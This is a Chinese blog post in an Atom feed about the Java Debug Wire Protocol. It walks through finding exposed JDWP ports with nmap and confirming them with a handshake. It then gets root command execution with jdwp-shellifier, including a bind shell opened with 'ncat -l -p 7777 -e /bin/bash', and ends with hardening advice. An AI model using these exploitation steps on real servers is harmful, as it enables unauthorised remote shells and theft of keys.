<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KL&#39;s blog</title>
  
  <subtitle>越积极，越幸运</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://qsli.github.io/"/>
  <updated>2018-08-11T22:12:16.670Z</updated>
  <id>http://qsli.github.io/</id>
  
  <author>
    <name>Kevin Leo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>jdwp远程调试与安全</title>
    <link href="http://qsli.github.io/2018/08/12/jdwp/"/>
    <id>http://qsli.github.io/2018/08/12/jdwp/</id>
    <published>2018-08-11T22:12:16.000Z</published>
    <updated>2018-08-11T22:12:16.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是JDWP？"><a href="#什么是JDWP？" class="headerlink" title="什么是JDWP？"></a>什么是JDWP？</h1><blockquote><p>JDWP（Java Debug Wire Protocol）是一个为 Java 调试而设计的一个通讯交互协议，它定义了调试器和被调试程序之间<strong>传递的信息的格式</strong>。在 JPDA 体系中，作为前端（front-end）的调试者（debugger）进程和后端（back-end）的被调试程序（debuggee）进程之间的交互数据的格式就是由 JDWP 来描述的，它详细完整地定义了请求命令、回应数据和错误代码，保证了前端和后端的 JVMTI 和 JDI 的通信通畅。比如在 Sun 公司提供的实现中，它提供了一个名为 jdwp.dll（jdwp.so）的动态链接库文件，这个动态库文件实现了一个 Agent，它会负责解析前端发出的请求或者命令，并将其转化为 JVMTI 调用，然后将 JVMTI 函数的返回值封装成 JDWP 数据发还给后端。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Components                          Debugger Interfaces</span><br><span class="line"></span><br><span class="line">                /    |--------------|</span><br><span class="line">               /     |     VM       |</span><br><span class="line"> debuggee ----(      |--------------|  &lt;------- JVM TI - Java VM Tool Interface</span><br><span class="line">               \     |   back-end   |</span><br><span class="line">                \    |--------------|</span><br><span class="line">                /           |</span><br><span class="line"> comm channel -(            |  &lt;--------------- JDWP - Java Debug Wire Protocol</span><br><span class="line">                \           |</span><br><span class="line">                     |--------------|</span><br><span class="line">                     | front-end    |</span><br><span class="line">                     |--------------|  &lt;------- JDI - Java Debug Interface</span><br><span class="line">                     |      UI      |</span><br><span class="line">                     |--------------|</span><br></pre></td></tr></table></figure><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jvmti" rel="external nofollow noopener noreferrer" target="_blank">JVM TI</a> -<strong>Java VM Tool Interface</strong></p><p>Defines the debugging services a VM provides.</p><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdwp" rel="external nofollow noopener noreferrer" target="_blank">JDWP</a> - <strong>Java Debug Wire Protocol</strong></p><p>Defines the communication between <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#debuggee" rel="external nofollow noopener noreferrer" target="_blank">debuggee</a> and debugger processes.</p><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdi" rel="external nofollow noopener noreferrer" target="_blank">JDI</a> - <strong>Java Debug Interface</strong></p><p>Defines a high-level Java language interface which tool developers can easily use to write remote debugger applications.</p><h1 id="发现开启了JDWP的端口"><a href="#发现开启了JDWP的端口" class="headerlink" title="发现开启了JDWP的端口"></a>发现开启了JDWP的端口</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p><code>nmap</code>是端口扫描的利器，支持批量扫描网段内端口打开的情况。通过<code>nmap</code>的扫描可以找到端口和对应的协议，这样就可以扫描到打开了远程debug的端口的机器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo nmap -sV 221.221.221.221</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:12 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 972 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">80/tcp    open     http           nginx 1.10.2</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">443/tcp   open     ssl/http       nginx 1.10.2</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1068/tcp  filtered instl_bootc</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">3333/tcp  filtered dec-notes</span><br><span class="line">3690/tcp  open     svnserve       Subversion</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">7070/tcp  open     http           nginx 1.10.3</span><br><span class="line">8081/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9998/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9999/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.42 seconds</span><br></pre></td></tr></table></figure><p>从扫描的结果中可以看到<code>10010</code>端口开启了远程调试。</p><h3 id="端口明明开了，却没有扫描到？"><a href="#端口明明开了，却没有扫描到？" class="headerlink" title="端口明明开了，却没有扫描到？"></a>端口明明开了，却没有扫描到？</h3><p>nmap默认只扫描每个协议常见的1000个端口，如果你的端口不在里面，默认就不会扫描。</p><blockquote><p><a href="https://nmap.org/book/man-port-specification.html" rel="external nofollow noopener noreferrer" target="_blank">Nmap scans the most common 1,000 ports for each protocol</a>. If your port is not in that list, it won’t be scanned. </p></blockquote><p>端口使用的频率存储在<code>nmap-services</code>文件中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) locate nmap-services</span><br><span class="line">/usr/<span class="built_in">local</span>/Cellar/nmap/7.70/share/nmap/nmap-services</span><br></pre></td></tr></table></figure><p>可以直接查看这个文件， 也可以使用下面的命令查看对应的频率：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) sudo nmap -v -oG - -sSU</span><br><span class="line">Password:</span><br><span class="line"># Nmap 7.70 scan initiated Fri Aug 10 13:46:47 2018 as: nmap -v -oG - -sSU</span><br><span class="line"># Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521...省略</span><br></pre></td></tr></table></figure><p>具体说明参见： <a href="https://secwiki.org/w/FAQ_missing_port" rel="external nofollow noopener noreferrer" target="_blank">FAQ missing port - SecWiki</a></p><p>解决方案：</p><p><code>nmap</code>中可以通过<code>-p</code>指定扫描的端口范围：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo nmap -sV 221.221.221.221  -p 1-65535</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:26 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)</span><br><span class="line">Host is up (0.035s latency).</span><br><span class="line">Not shown: 65464 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">80/tcp    open     http           nginx 1.10.2</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">136/tcp   filtered profile</span><br><span class="line">137/tcp   filtered netbios-ns</span><br><span class="line">138/tcp   filtered netbios-dgm</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">443/tcp   open     ssl/http       nginx 1.10.2</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1068/tcp  filtered instl_bootc</span><br><span class="line">2745/tcp  filtered urbisnet</span><br><span class="line">3127/tcp  filtered ctx-bridge</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">3333/tcp  filtered dec-notes</span><br><span class="line">3690/tcp  open     svnserve       Subversion</span><br><span class="line">3691/tcp  open     svnserve       Subversion</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">4999/tcp  open     http           Apache httpd 2.4.10 ((Debian))</span><br><span class="line">5554/tcp  filtered sgi-esphttp</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6176/tcp  filtered unknown</span><br><span class="line">6379/tcp  open     redis          Redis key-value store</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">7070/tcp  open     http           nginx 1.10.3</span><br><span class="line">8076/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8081/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8146/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8183/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8188/tcp  open     unknown</span><br><span class="line">8189/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8280/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8283/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8380/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8399/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8694/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8967/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8998/tcp  filtered canto-roboflow</span><br><span class="line">9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9058/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">9060/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171</span><br><span class="line">9260/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">9928/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">9988/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">9990/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9991/tcp  open     http           Jetty 9.4.8.v20171121</span><br><span class="line">9996/tcp  filtered palace-5</span><br><span class="line">9997/tcp  open     http           Jetty 9.4.8.v20171121</span><br><span class="line">9998/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9999/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">10018/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">11114/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171</span><br><span class="line">11211/tcp open     memcached      Memcached 1.4.34 (uptime 20219548 seconds)</span><br><span class="line">12001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">12003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">13001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">13003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">14002/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">15001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">19998/tcp open     http           Jetty 9.4.7.v20170914</span><br><span class="line">29998/tcp open     http           Jetty 9.4.7.v20170914</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 87.05 seconds</span><br></pre></td></tr></table></figure><p>上面是dev机器上开启的端口， <code>Java Debug Wire Protocol (Reference Implementation)</code>就是开启了<code>JDWP</code>的机器。</p><h2 id="二次确认"><a href="#二次确认" class="headerlink" title="二次确认"></a>二次确认</h2><blockquote><p>telnet端口后，输入命令JDWP-Handshake<br>如果返回JDWP-Handshake，证明存在漏洞。</p></blockquote><p>可以用下面的命令测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) &#123; <span class="built_in">echo</span> <span class="string">"JDWP-Handshake"</span>; sleep 20 &#125; | telnet 221.221.221.221 10010</span><br><span class="line">Trying 221.221.221.221...</span><br><span class="line">Connected to izbp16k6k2yv9vvh6c3v65zi.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">JDWP-Handshake</span><br></pre></td></tr></table></figure><p>或者使用<code>nc</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) &#123; <span class="built_in">echo</span> <span class="string">"JDWP-Handshake"</span>; sleep 1 | <span class="built_in">trap</span> <span class="built_in">exit</span> INT&#125; | nc 221.221.221.221 10010</span><br><span class="line">JDWP-Handshake</span><br></pre></td></tr></table></figure><h1 id="漏洞利用实战"><a href="#漏洞利用实战" class="headerlink" title="漏洞利用实战"></a>漏洞利用实战</h1><h2 id="确定debug的端口"><a href="#确定debug的端口" class="headerlink" title="确定debug的端口"></a>确定debug的端口</h2><p>通过<code>nmap</code>确定debug的端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation)</span><br></pre></td></tr></table></figure><h2 id="nmap执行命令"><a href="#nmap执行命令" class="headerlink" title="nmap执行命令"></a>nmap执行命令</h2><p><a href="https://nmap.org/nsedoc/scripts/jdwp-exec.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-exec NSE Script</a></p><p><a href="https://nmap.org/nsedoc/scripts/jdwp-info.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-info NSE Script</a></p><p><a href="https://nmap.org/nsedoc/scripts/jdwp-inject.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-inject NSE Script</a></p><blockquote><p>这种方式没有实验成功，有兴趣的同学可以试一试</p></blockquote><ul><li>Example Usage</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT &lt;target&gt; -p &lt;port&gt; --script=+jdwp-exec --script-args cmd=&quot;date&quot;</span><br></pre></td></tr></table></figure><ul><li>Script Output</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON</span><br><span class="line">2010/tcp open  search  syn-ack</span><br><span class="line">| jdwp-exec:</span><br><span class="line">|   date output:</span><br><span class="line">|   Sat Aug 11 15:27:21 Central European Daylight Time 2012</span><br><span class="line">|_</span><br></pre></td></tr></table></figure><h2 id="开源脚本"><a href="#开源脚本" class="headerlink" title="开源脚本"></a>开源脚本</h2><p><a href="https://github.com/IOActive/jdwp-shellifier" rel="external nofollow noopener noreferrer" target="_blank">IOActive/jdwp-shellifier</a></p><p>使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) python jdwp-shellifier.py -t 221.221.221.221 -p 10010  --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span>  --cmd <span class="string">"touch /home/777"</span></span><br><span class="line">[+] Targeting <span class="string">'221.221.221.221:10010'</span></span><br><span class="line">[+] Reading settings <span class="keyword">for</span> <span class="string">'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'</span></span><br><span class="line">[+] Found Runtime class: id=346d</span><br><span class="line">[+] Found Runtime.getRuntime(): id=7fd8f420b170</span><br><span class="line">[+] Created <span class="built_in">break</span> event id=2</span><br><span class="line">[+] Waiting <span class="keyword">for</span> an event on <span class="string">'java.lang.String.indexOf'</span></span><br><span class="line">[+] Received matching event from thread 0x355c</span><br><span class="line">[+] Selected payload <span class="string">'touch /home/777'</span></span><br><span class="line">[+] Command string object created id:355d</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0x355e</span><br><span class="line">[+] found Runtime.exec(): id=7fd8f40140f0</span><br><span class="line">[+] Runtime.exec() successful, retId=355f</span><br><span class="line">[!] Command successfully executed</span><br></pre></td></tr></table></figure><p><code>break-on &quot;java.lang.String.indexOf&quot;</code>表示在这个函数打断点，当这个函数执行的时候， 后面跟着的命令就会执行，这时我们登录上机器查看下执行的结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]<span class="comment"># ls -alh  /home</span></span><br><span class="line">总用量 52K</span><br><span class="line">drwxr-xr-x. 13 root          root          4.0K 8月  10 14:12 .</span><br><span class="line">dr-xr-xr-x. 28 root          root          4.0K 7月  19 17:52 ..</span><br><span class="line">-rw-r--r--   1 root          root             0 8月  10 14:12 777</span><br></pre></td></tr></table></figure><p>可以看到<code>777</code>这个文件已经创建了， 时间正好是我们执行命令的时间。</p><p>这只是初级玩法， 脚本的示例给的是启动一个<code>ncat</code>的程序， 然后就可以远程连接上这个ncat开启的端口，相当于有一个<code>root</code>权限的shell了。</p><p>安装<code>ncat</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --break-on &quot;java.lang.String.indexOf&quot;  --cmd  &quot;sudo yum install -y nc&quot;</span><br></pre></td></tr></table></figure><p><code>ncat</code>在服务器上开启一个端口， 转发输入交给<code>bash</code>去执行。</p><p>开启转发服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span>  --cmd  <span class="string">"ncat -v -l -p 7777 -e /bin/bash"</span></span><br><span class="line">[+] Targeting <span class="string">'221.221.221.221:8399'</span></span><br><span class="line">[+] Reading settings <span class="keyword">for</span> <span class="string">'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'</span></span><br><span class="line">[+] Found Runtime class: id=345e</span><br><span class="line">[+] Found Runtime.getRuntime(): id=7f6420023408</span><br><span class="line">[+] Created <span class="built_in">break</span> event id=2</span><br><span class="line">[+] Waiting <span class="keyword">for</span> an event on <span class="string">'java.lang.String.indexOf'</span></span><br><span class="line">[+] Received matching event from thread 0x354e</span><br><span class="line">[+] Selected payload <span class="string">'ncat -v -l -p 7777 -e /bin/bash'</span></span><br><span class="line">[+] Command string object created id:354f</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0x3550</span><br><span class="line">[+] found Runtime.exec(): id=7f6420023468</span><br><span class="line">[+] Runtime.exec() successful, retId=3551</span><br><span class="line">[!] Command successfully executed</span><br></pre></td></tr></table></figure><p>服务器上端口已经开启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]# sudo lsof -i:7777</span><br><span class="line">COMMAND  PID USER   FD   TYPE    DEVICE SIZE/OFF NODE NAME</span><br><span class="line">ncat    7617 root    3u  IPv6 292856080      0t0  TCP *:cbt (LISTEN)</span><br><span class="line">ncat    7617 root    4u  IPv4 292856081      0t0  TCP *:cbt (LISTEN)</span><br></pre></td></tr></table></figure><p>连接上去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) nc 221.221.221.221 7777</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">ls -alh</span><br><span class="line">total 218M</span><br><span class="line">dr-xr-x---. 18 root root 4.0K Aug 10 11:05 .</span><br><span class="line">dr-xr-xr-x. 28 root root 4.0K Jul 19 17:52 ..</span><br><span class="line">-rw-r--r--   1 root root   26 May 11 13:57 12.txt</span><br><span class="line">-rwxr-xr-x   1 root root 1.7K Jan 30  2018 214468302700277.key</span><br><span class="line">-rwxr-xr-x   1 root root 3.3K Jan 30  2018 214468302700277.pem</span><br></pre></td></tr></table></figure><h1 id="远程调试的建议"><a href="#远程调试的建议" class="headerlink" title="远程调试的建议"></a>远程调试的建议</h1><p>一、线上不能开启debug，对服务器性能有影响。</p><p>二、关闭对外远程debug的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -i:&lt;port&gt;</span><br></pre></td></tr></table></figure><p>查找到对应的进程， 然后修改配置，<strong>重启tomcat</strong></p><p>三、远程debug步骤：</p><ol><li><p>tomcat 开启调试: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CATALINA_OPTS=<span class="string">"-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=127.0.0.1:8399"</span></span><br></pre></td></tr></table></figure><p><strong>注意必须绑定到127.0.0.1</strong></p></li><li><p>安装socat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y socat</span><br></pre></td></tr></table></figure></li><li><p>服务器安装socat进行转发:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:5005forkrange=0.0.0.0/32 TCP4:127.0.0.1:8399 | hostname -i</span><br></pre></td></tr></table></figure><p>其中<code>0.0.0.0/32</code>表示放开ip限制（不是内网没有办法限制出口ip)， <strong>命令不要在后台执行</strong>，否则跟开启了对外的远程debug没有区别</p></li><li><p>idea中新建Remote配置，host写上面输出的公网的ip， 端口写5005</p></li></ol><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><ul><li>远程调试端口的地址一定要绑定到<code>127.0.0.1</code></li><li>tomcat用单独的组的用户启动（这个组的权限要设置到较低）</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jpda1/index.html?ca=drs-" rel="external nofollow noopener noreferrer" target="_blank">深入 Java 调试体系: 第 1 部分，JPDA 体系概览</a></li><li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html" 